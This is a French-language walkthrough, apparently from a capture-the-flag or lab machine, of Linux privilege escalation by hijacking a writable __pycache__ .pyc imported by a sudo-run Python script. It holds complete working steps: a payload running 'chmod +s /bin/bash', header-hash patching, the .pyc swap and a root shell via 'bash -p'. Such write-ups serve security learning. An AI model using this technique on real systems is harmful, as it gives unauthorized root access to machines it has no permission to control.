# Privilege Escalation via Python Bytecode Hijacking

## <mark style="color:red;">Privilege Escalation via Python Bytecode Hijacking</mark>

### <mark style="color:blue;">Contexte</mark>

Un utilisateur peut exécuter avec `sudo` un script Python qui importe un module externe. Si le répertoire `__pycache__` est accessible en écriture, on peut remplacer le bytecode compilé du module par un payload malveillant.

***

### <mark style="color:blue;">Conditions nécessaires</mark>

| Condition              | Détail                                                |
| ---------------------- | ----------------------------------------------------- |
| Script sudo            | Un script Python exécutable en root sans mot de passe |
| Import de module       | Le script importe un module local (pas stdlib)        |
| Écriture `__pycache__` | `ls -la` montre que larry peut écrire dans le dossier |

Vérification :

```bash
sudo -l
# (root) NOPASSWD: /opt/extensiontool/extension_tool.py

ls -la /opt/extensiontool/__pycache__/
# drwxrwxr-x larry larry   ← écriture possible !
```

***

### <mark style="color:blue;">Pourquoi ça marche</mark>

Quand Python importe un module, il cherche en priorité le `.pyc` dans `__pycache__`. Si ce fichier existe, Python **l'exécute directement sans vérifier le code source** `.py`.

```
script.py fait : from extension_utils import ...
         ↓
Python cherche __pycache__/extension_utils.cpython-312.pyc
         ↓
Si le .pyc existe → l'exécute directement
         ↓
Notre payload s'exécute en tant que ROOT
```

***

Étape 1 — Créer le payload

```python
# evil.py
import os
os.system("chmod +s /bin/bash")
```

***

Étape 2 — Compiler en bytecode

```python
# compile.py
import py_compile
py_compile.compile('evil.py', cfile='evil.cpython-312.pyc')
```

```bash
python3 compile.py
```

***

Étape 3 — Corriger le header du .pyc

Un fichier `.pyc` a cette structure :

```
[Octets 0-7 ]  → Magic number (version Python)
[Octets 8-15]  → Hash/timestamp du fichier source
[Octets 16+ ]  → Bytecode compilé
```

Il faut copier les octets `8-15` du fichier légitime dans notre payload pour que Python accepte le fichier :

```python
# exploit.py
original = open("/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc", "rb").read()
hash_bytes = original[8:16]          # on récupère le hash légitime

pyc = open("evil.cpython-312.pyc", "rb").read()
pyc_final = pyc[:8] + hash_bytes + pyc[16:]   # on l'injecte dans notre payload

with open("evil_final.cpython-312.pyc", "wb") as f:
    f.write(pyc_final)
```

```bash
python3 exploit.py
```

***

Étape 4 — Remplacer le bytecode légitime

```bash
rm /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
cp evil_final.cpython-312.pyc /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
```

***

Étape 5 — Déclencher et obtenir root

```bash
# Déclenche le payload (Python charge notre .pyc en root)
sudo /opt/extensiontool/extension_tool.py --ext Fontify --zip

# /bin/bash a maintenant le bit SUID → on spawn un shell root
/bin/bash -p

whoami
# root
```

***

Résumé visuel

```
larry écrit evil_final.pyc dans __pycache__
              ↓
sudo python script.py
              ↓
Python importe extension_utils → charge notre .pyc
              ↓
os.system("chmod +s /bin/bash") s'exécute en ROOT
              ↓
/bin/bash -p  →  shell root ✅
```

***

Points clés à retenir

| Élément                | Rôle                                             |
| ---------------------- | ------------------------------------------------ |
| `__pycache__` writable | La condition exploitable                         |
| `.pyc` prioritaire     | Python ne relit pas le `.py` si le `.pyc` existe |
| Header hash            | Nécessaire pour que Python accepte le fichier    |
| `chmod +s /bin/bash`   | Pose le bit SUID sur bash                        |
| `bash -p`              | Lance bash en préservant les privilèges SUID     |
